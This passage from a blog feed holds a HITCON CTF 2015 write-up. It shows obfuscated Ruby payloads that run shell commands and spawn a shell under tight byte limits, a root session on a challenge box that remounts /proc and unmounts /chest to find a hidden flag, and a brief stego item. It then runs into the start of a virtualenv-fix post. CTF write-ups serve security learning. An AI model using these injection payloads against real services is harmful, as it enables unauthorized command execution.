&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;__&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;which equal to  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cat ./flag&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;as a string input.&lt;br /&gt;
then we got flag1.&lt;br /&gt;
&lt;code&gt;hitcon{what does the ruby say? @#$%!@&amp;amp;(%!#$&amp;amp;(%!@#$!$?...}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Flag2 (64 bytes)&lt;/h3&gt;
&lt;p&gt;After this, we got stucked with the 64 bytes limitation.&lt;br /&gt;
I came up with calling &lt;code&gt;sh&lt;/code&gt; to get shell instead of just &lt;code&gt;cat flag&lt;/code&gt;,&lt;br /&gt;
and one of my teammates found out that &lt;code&gt;$$&lt;/code&gt; is always &lt;code&gt;4&lt;/code&gt; on the target server.&lt;br /&gt;
So, we came up with the &lt;code&gt;61 bytes&lt;/code&gt; solution for flag2.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  

&lt;span class="c1"&gt;# $_ = 1, @_ = 10, $. = 104, $.+@_+$_ = 115; ascii(&amp;#39;s&amp;#39;) == 115; ascii(&amp;#39;h&amp;#39;) == 104;  &lt;/span&gt;
&lt;span class="c1"&gt;# `#{&amp;#39;&amp;#39;&amp;lt;&amp;lt;115&amp;lt;&amp;lt;104}` == `#{&amp;#39;sh&amp;#39;}`  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After got the shell, just type &lt;code&gt;cat flag&lt;/code&gt; then &lt;code&gt;^D&lt;/code&gt; to get the output.&lt;br /&gt;
We got flag2.&lt;br /&gt;
&lt;code&gt;hitcon{Ruby in Peace m()m}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Flag3 (36 bytes)&lt;/h3&gt;
&lt;p&gt;One of my teammates came up with calling &lt;code&gt;$0&lt;/code&gt; instead of &lt;code&gt;sh&lt;/code&gt; to get shell,&lt;br /&gt;
we got the &lt;code&gt;26 bytes&lt;/code&gt; solution.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;$&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  

&lt;span class="c1"&gt;# `#{&amp;#39;$&amp;#39;&amp;lt;&amp;lt;48}` == `#{&amp;#39;$0&amp;#39;}`  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;then we got flag3&lt;br /&gt;
&lt;code&gt;hitcon{My cats also know how to code in ruby :cat:}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Flag4 (10 bytes)&lt;/h3&gt;
&lt;p&gt;After this, I was trying to find how to just embed number into the string not by using &lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;.&lt;br /&gt;
I found this link &lt;a href="http://stackoverflow.com/questions/17169671/ruby-eval-with-string-interpolation"&gt;Ruby: eval with string interpolation - Stack Overflow&lt;/a&gt;.&lt;br /&gt;
I also found that the predefined variable &lt;code&gt;$.&lt;/code&gt; is &lt;code&gt;The number of the last line read from the current input file.&lt;/code&gt;&lt;br /&gt;
It means that in this use case, &lt;code&gt;$.&lt;/code&gt; will always be &lt;code&gt;1&lt;/code&gt;.&lt;br /&gt;
so I came up with &lt;code&gt;11 bytes&lt;/code&gt; solution  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`$&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Still 1 byte more than the limitation,&lt;br /&gt;
I kept finding if there's a predefined variable in Ruby defualt to &lt;code&gt;0&lt;/code&gt; or&lt;br /&gt;
if &lt;code&gt;nil&lt;/code&gt; can be trans to &lt;code&gt;0&lt;/code&gt; because lots of predefined variable are default to &lt;code&gt;nil&lt;/code&gt;.&lt;br /&gt;
But NO.  &lt;/p&gt;
&lt;p&gt;Then one of my teammates came up with the &lt;code&gt;10 bytes&lt;/code&gt; solution,&lt;br /&gt;
by using &lt;code&gt;~&lt;/code&gt;, the &lt;code&gt;Binary Ones Complement Operator&lt;/code&gt;. (bitwise Not)  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`$&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="o"&gt;~-&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  

&lt;span class="c1"&gt;# `$#{~-1}` == `$#{0}` == `$0`  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;then we got flag4&lt;br /&gt;
&lt;code&gt;hitcon{It's hard to say where ruby went wrong QwO}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Note&lt;/h3&gt;
&lt;p&gt;After the competition end,&lt;br /&gt;
the author of this challenge released the same 10 bytes solution on IRC.&lt;br /&gt;
But said they got a &lt;code&gt;9 bytes&lt;/code&gt; solution  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`$&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="sr"&gt;//&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I don't know how this solution works,&lt;br /&gt;
but it does not work on my computer with Ruby 2.2.3,&lt;br /&gt;
which &lt;code&gt;~//&lt;/code&gt; will be treat as &lt;code&gt;nil&lt;/code&gt; instead of &lt;code&gt;0&lt;/code&gt;.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Stego - Piranha Gun [50]&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;The Piranha Gun is a post-Plantera Hardmode ranged weapon that fires a single, returning &amp;quot;piranha&amp;quot; projectile that costs no ammunition.  
`nc 54.178.235.243 10004`  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc &lt;span class="m"&gt;54&lt;/span&gt;.178.235.243 &lt;span class="m"&gt;10004&lt;/span&gt;  
bash: cannot &lt;span class="nb"&gt;set&lt;/span&gt; terminal process group &lt;span class="o"&gt;(&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class="k"&gt;for&lt;/span&gt; device  
bash: no job control in this shell  
bash: /root/.bashrc: Permission denied  
root@ip-172-31-19-201:/home/PiranhaGun# ls  
ls  
README  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After connected to the server, there's a README.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/home/PiranhaGun# cat README  
cat README  
The Piranha Gun can be found in &amp;quot;jungle.chest&amp;quot;.  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We searched if there's a file or directory with this name by using  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;grep -r "jungle.chest" / 2&amp;gt;/dev/null&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;grep -r "jungle" / 2&amp;gt;/dev/null&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;grep -r "chest" / 2&amp;gt;/dev/null&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;But NO. There's only a directory &lt;code&gt;/chest&lt;/code&gt;, but it's empty.  &lt;/p&gt;
&lt;p&gt;After tried something else, we still stucked.&lt;br /&gt;
Then, one of my teammates said he remembered security issue about the &lt;code&gt;proc&lt;/code&gt; in container.&lt;br /&gt;
After took a look at &lt;code&gt;ps&lt;/code&gt;, we got a clue.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/home/PiranhaGun# ps  
ps  
Error, do this: mount -t proc proc /proc  
root@ip-172-31-19-201:/home/PiranhaGun# mount -t proc proc /proc  
mount -t proc proc /proc  
root@ip-172-31-19-201:/home/PiranhaGun# cd /proc  
cd /proc  
root@ip-172-31-19-201:/proc# ls -al  
ls -al  
total 4  
dr-xr-xr-x 128 nobody nogroup               0 Oct 19 05:25 .  
drwxr-xr-x  23 nobody nogroup            4096 Oct 16 13:29 ..  
dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 1  
dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 2  
dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 7  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 acpi  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 buddyinfo  
dr-xr-xr-x   4 nobody nogroup               0 Oct 19 05:26 bus  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cgroups  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cmdline  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 consoles  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cpuinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 crypto  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 devices  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 diskstats  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 dma  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 driver  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 execdomains  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 fb  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 filesystems  
dr-xr-xr-x   8 nobody nogroup               0 Oct 19 05:26 fs  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 interrupts  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 iomem  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 ioports  
dr-xr-xr-x  49 nobody nogroup               0 Oct 19 05:26 irq  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 kallsyms  
-r--------   1 nobody nogroup 140737477877760 Oct 19 05:26 kcore  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 key-users  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 keys  
-r--------   1 nobody nogroup               0 Oct 19 05:26 kmsg  
-r--------   1 nobody nogroup               0 Oct 19 05:26 kpagecount  
-r--------   1 nobody nogroup               0 Oct 19 05:26 kpageflags  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 loadavg  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 locks  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 mdstat  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 meminfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 misc  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 modules  
lrwxrwxrwx   1 nobody nogroup              11 Oct 19 05:26 mounts -&amp;gt; self/mounts  
-rw-r--r--   1 nobody nogroup               0 Oct 19 05:26 mtrr  
lrwxrwxrwx   1 nobody nogroup               8 Oct 19 05:26 net -&amp;gt; self/net  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 pagetypeinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 partitions  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 sched_debug  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 schedstat  
dr-xr-xr-x   3 nobody nogroup               0 Oct 19 05:26 scsi  
lrwxrwxrwx   1 nobody nogroup               0 Oct 19 05:25 self -&amp;gt; 7  
-r--------   1 nobody nogroup               0 Oct 19 05:26 slabinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 softirqs  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 stat  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 swaps  
dr-xr-xr-x   1 nobody nogroup               0 Oct 19 05:26 sys  
--w-------   1 nobody nogroup               0 Oct 19 05:26 sysrq-trigger  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 sysvipc  
lrwxrwxrwx   1 nobody nogroup               0 Oct 19 05:25 thread-self -&amp;gt; 7/task/7  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 timer_list  
-rw-r--r--   1 nobody nogroup               0 Oct 19 05:26 timer_stats  
dr-xr-xr-x   4 nobody nogroup               0 Oct 19 05:26 tty  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 uptime  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 version  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 version_signature  
-r--------   1 nobody nogroup               0 Oct 19 05:26 vmallocinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 vmstat  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 xen  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 zoneinfo  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let's take some search.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/proc# grep -r &amp;quot;chest&amp;quot; . 2&amp;gt;/dev/null  
grep -r &amp;quot;chest&amp;quot; . 2&amp;gt;/dev/null  
./1/task/1/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./1/task/1/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./1/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./1/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./2/task/2/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./2/task/2/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./2/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./2/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./2/mountstats:device /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d mounted on /chest with fstype ext4  
Binary file ./15/task/15/cmdline matches  
./15/task/15/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./15/task/15/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
Binary file ./15/cmdline matches  
./15/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./15/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./15/mountstats:device /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d mounted on /chest with fstype ext4  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We've already found &lt;code&gt;/chest&lt;/code&gt; before and knew it's empty.&lt;br /&gt;
So, maybe unmount it?  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/proc# umount /chest  
umount /chest  
root@ip-172-31-19-201:/proc# cd /chest  
cd /chest  
root@ip-172-31-19-201:/chest# ls  
ls  
jungle.chest  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;ta da!  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/chest# cat jungle.chest  
cat jungle.chest  
hitcon{Wh1re d!d Y0u F1nd the Jungle Key}  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Stego - unreadable [100]&lt;/h2&gt;
&lt;p&gt;We got a file &lt;a href="/files/hitcon-ctf-2015-quals-write-up/unreadable-4b2868cc26a8dad5695e537a9dd8a164"&gt;unreadable-4b2868cc26a8dad5695e537a9dd8a164&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;by using &lt;code&gt;xxd&lt;/code&gt; to check it.  &lt;/p&gt;
&lt;p&gt;&lt;img alt="unreadable" src="/files/hitcon-ctf-2015-quals-write-up/unreadable.png" /&gt;  &lt;/p&gt;
&lt;p&gt;the flag is &lt;code&gt;hitcon{WE USE XXD INSTEAD OF IDA PRO}&lt;/code&gt;  &lt;/p&gt;</summary><category term="CTF"></category><category term="HITCON"></category><category term="Write-up"></category><category term="Ruby"></category><category term="Conf"></category><category term="Security"></category></entry><entry><title>Fix virtualenv after an upgrade of Python</title><link href="https://blog.m157q.tw/posts/2015/10/07/fix-virtualenv-after-an-upgrade-of-python/" rel="alternate"></link><published>2017-01-16T22:29:41+08:00</published><updated>2017-01-16T22:29:41+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-10-07:posts/2015/10/07/fix-virtualenv-after-an-upgrade-of-python/</id><summary type="html">&lt;h2&gt;Manual&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~/.virtualenvs  
$ find &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;envname&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;/ -type l -delete  
$ virtualenv &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;envname&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Script for one virtualenv&lt;/h2&gt;
&lt;p&gt;Here's a tiny script from &lt;a href="https://gist.github.com/tevino/1a557a0c200d61d4e4fb"&gt;Fix python virtualenv after python update · GitHub&lt;/a&gt; for doing this.  &lt;/p&gt;
